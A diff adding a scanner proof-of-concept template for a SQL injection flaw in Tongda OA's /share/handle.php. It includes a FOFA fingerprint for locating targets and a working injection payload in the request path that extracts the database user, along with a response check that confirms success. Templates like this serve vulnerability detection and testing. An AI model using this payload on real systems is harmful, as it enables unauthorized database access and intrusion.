@@ -1,0 +1,14 @@
+id: poc-yaml-tongda-oa-handle-php-sqli
+info:
+  name: 通达OA handle.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20user()--+
+  expression: status_code == 200 && contains(body,`"status":"1"`) && contains(body,"share_id=root@")
+variables: {}
+transport: http
